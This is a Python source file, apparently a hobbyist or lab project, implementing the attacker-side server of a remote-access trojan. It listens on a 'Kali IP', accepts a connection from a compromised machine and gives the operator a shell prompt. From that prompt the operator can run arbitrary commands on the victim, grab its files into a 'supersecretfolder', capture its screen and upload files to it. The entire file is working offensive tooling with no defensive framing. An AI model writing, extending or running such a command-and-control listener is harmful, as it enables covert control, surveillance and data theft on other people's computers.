import socket
import os



def doSend(mysocket, sourcePath, destPath, fileName):
    try:
        full_path = os.path.join(sourcePath, fileName)
        print(f"[~] Looking for file {full_path}")
        #check if file exists
        if not os.path.exists(full_path):
            mysocket.send(b"File not found")
            print(f"File does not exist: {full_path}")
            return
        #check if file is empty
        if os.path.getsize(full_path) == 0:
            mysocket.send(b"File is empty")
            print(f"File is empty: {full_path}")
            return

        #send file data
        with open(full_path, 'rb') as sourceFile:
            while True:
                packet = sourceFile.read(1024)
                if not packet:
                    break
                mysocket.send(packet)
            mysocket.send(b"DONE")
            print("[+]File Transfer Complete: {full_path}")

    except Exception as e:
        mysocket.send(b"File transfer error")
        print(f"[-] Error during file send{str(e)}")



def doGrab(conn, userinput, operation):
    try:
        conn.send(userinput.encode()) #send command to client
        path = "/home/chris/desktop/supersecretfolder/"
        # ensure the directory exists
        os.makedirs(path, exist_ok=True)

        if operation == 'grab':
            parts = userinput.split('*')
            if len(parts) < 2:
                print("[-] Invalid grab command format")
                return
            _, sourcePathAsFileName = parts
            fileName = "grabbed_" + os.path.basename(sourcePathAsFileName)

        elif operation == "screenCap":
            fileName = "screenshot.jpg"

        file_path = os.path.join(path, fileName)
        with open(file_path, 'ab') as f:
            while True:
                bits = conn.recv(1024)
                if not bits:
                    break
                if bits.endswith(b'DONE'):
                    f.write(bits[:-4])
                    print('[-] Wold Domination Achieved!')
                    break
                if b'File not found' in bits:
                    print('[-] File not found!')
                    return
                f.write(bits)

        print(f'[+] File saved as: {fileName}')
        print(f'location: {path}')
    except Exception as e:
        print(f'[-] Error in file transfer. Self destruction triggered. Error: {e}')

def chris():
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.bind(('192.168.86.43', 8080)) #Kali IP
    mysocket.listen(1)
    print('[+] Listening on port 8080')

    conn, address  = mysocket.accept()
    print(f"[+] Accepted connection from: {address}")
    while True:
        try:
            userinput = input("Shell > ").strip()
            if userinput.lower() == "tem":
                conn.send(b"tem")
                conn.close()
                break

            elif userinput.startswith("grab"):
                doGrab(conn,userinput,"grab")

            elif 'send' in userinput:
                sendCmd, destination, fileName = userinput.split('*')
                source = input("Source path: ")
                conn.send(userinput.encode())
                doSend(conn, source, destination, fileName)

            elif "screenCap" in userinput:
                doGrab(conn, userinput, "screenCap")


            else:
                conn.send(userinput.encode())
                response=conn.recv(1024).decode(errors='ignore')
                print(response)

        except Exception as e:
            print(f'[-] Error in file transfer: {e}')

def main():
    chris()
if __name__ == '__main__':
    main()


